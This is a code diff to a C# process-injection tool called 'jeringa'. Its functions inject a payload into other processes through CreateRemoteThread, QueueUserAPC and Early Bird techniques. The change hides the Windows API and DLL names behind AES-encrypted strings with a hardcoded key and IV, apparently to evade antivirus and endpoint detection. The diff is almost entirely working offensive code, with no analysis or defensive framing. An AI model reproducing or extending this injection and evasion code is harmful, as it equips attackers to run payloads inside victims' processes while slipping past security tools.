@@ -12,33 +12,10 @@ namespace jeringa
 {
     class Program
     {
-        /*
-        // [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId); static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
-        // [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId); static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
-        // [DllImport("advapi32.dll", SetLastError = true)] private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
-        // [DllImport("kernel32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)] private static extern bool CloseHandle(IntPtr hObject);      
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-        [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
-        // [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-        [DllImport("kernel32.dll")] static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-        [DllImport("kernel32.dll")] public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
-        [DllImport("kernel32.dll", SetLastError = true)] static extern uint ResumeThread(IntPtr hThread);
+        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
+        static String password = "ricardojoserf   ";
+        static String iv = "jeringa jeringa ";
 
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)] static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,[In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-        // [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)] static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-        // [DllImport("kernel32.dll")] public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-        // [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-        // [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
-        // [DllImport("kernel32.dll")] public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, uint dwData);
-        // [DllImport("kernel32.dll")] public static extern uint ResumeThread(IntPtr hThread);
-        // [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-        // [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
-        // [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId); static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
-        // [DllImport("kernel32.dll")] public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, uint dwData);
-        // [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
-         */
-
-        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1); // [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId); static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
         [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
         [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
@@ -122,8 +99,11 @@ namespace jeringa
             IntPtr processHandle = IntPtr.Zero;
             try
             {
-                IntPtr a32 = GetModuleHandle("advapi32.dll");
-                IntPtr addrOpenProcessToken = GetProcAddress(a32, "OpenProcessToken");
+                String decryptedAdvapi32 = DecryptStringFromBytes("9dOYL40gX4b0hNu/qgaXgA==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+                String decryptedOpenProcessToken = DecryptStringFromBytes("sF3ICi5AMd+hES18ADsvonBk3cp8AKV1ZyuKqaotGS8=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+
+                IntPtr a32 = GetModuleHandle(decryptedAdvapi32);
+                IntPtr addrOpenProcessToken = GetProcAddress(a32, decryptedOpenProcessToken);
                 OpenProcessTokenDelegate auxOpenProcessToken = (OpenProcessTokenDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcessToken, typeof(OpenProcessTokenDelegate));
                 auxOpenProcessToken(process.Handle, 8, out processHandle);
                 WindowsIdentity wi = new WindowsIdentity(processHandle);
@@ -138,8 +118,11 @@ namespace jeringa
             {
                 if (processHandle != IntPtr.Zero)
                 {
-                    IntPtr k32 = GetModuleHandle("kernel32.dll");
-                    IntPtr addrCloseHandle = GetProcAddress(k32, "CloseHandle");
+                    String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+                    String decryptedCloseHandle = DecryptStringFromBytes("raaWfwu7TWCs4mgnq8Pytg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+
+                    IntPtr k32 = GetModuleHandle(decryptedKernel32);
+                    IntPtr addrCloseHandle = GetProcAddress(k32, decryptedCloseHandle);
                     CloseHandleDelegate auxCloseHandle = (CloseHandleDelegate)Marshal.GetDelegateForFunctionPointer(addrCloseHandle, typeof(CloseHandleDelegate));
                     auxCloseHandle(processHandle);
                 }
@@ -240,10 +223,11 @@ namespace jeringa
 
         static void injectShellcodeCreateRemoteThread(String processPID, String payload)
         {
-            IntPtr k32 = GetModuleHandle("kernel32.dll");
             RijndaelManaged myRijndael = new RijndaelManaged();
-            String password = "ricardojoserf   ";
-            String iv = "jeringa jeringa ";
+
+            String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            IntPtr k32 = GetModuleHandle(decryptedKernel32);
+           
             String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
@@ -280,10 +264,12 @@ namespace jeringa
 
         static void injectShellcodeQueueUserAPC(String processPID, String payload)
         {
-            IntPtr k32 = GetModuleHandle("kernel32.dll");
             RijndaelManaged myRijndael = new RijndaelManaged();
-            String password = "ricardojoserf   ";
-            String iv = "jeringa jeringa ";
+
+            String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            IntPtr k32 = GetModuleHandle(decryptedKernel32);
+
+
             String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
@@ -325,10 +311,11 @@ namespace jeringa
 
         static void injectShellcodeEarlyBird(String processname, String payload)
         {
-            IntPtr k32 = GetModuleHandle("kernel32.dll");
             RijndaelManaged myRijndael = new RijndaelManaged();
-            String password = "ricardojoserf   ";
-            String iv = "jeringa jeringa ";
+
+            String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
+            IntPtr k32 = GetModuleHandle(decryptedKernel32);
+
             String decryptedCreateProcessA = DecryptStringFromBytes("2FXtT/hu7ZEj8oz79680TQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
